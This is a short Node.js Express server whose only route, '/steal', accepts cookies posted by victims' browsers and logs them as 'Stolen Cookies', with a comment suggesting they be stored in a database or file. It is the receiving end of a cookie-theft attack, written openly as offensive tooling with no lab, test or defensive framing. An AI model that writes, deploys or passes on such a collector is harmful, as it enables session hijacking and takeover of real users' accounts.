const express = require('express');
const bodyParser = require('body-parser');
const app = express();
const port = 3000;

app.use(bodyParser.json());

app.post('/steal', (req, res) => {
    const { cookies } = req.body;
    console.log('Stolen Cookies:', cookies);
    // You can save the cookies to a database or a file here
    res.sendStatus(200);
});

app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}/`);
});
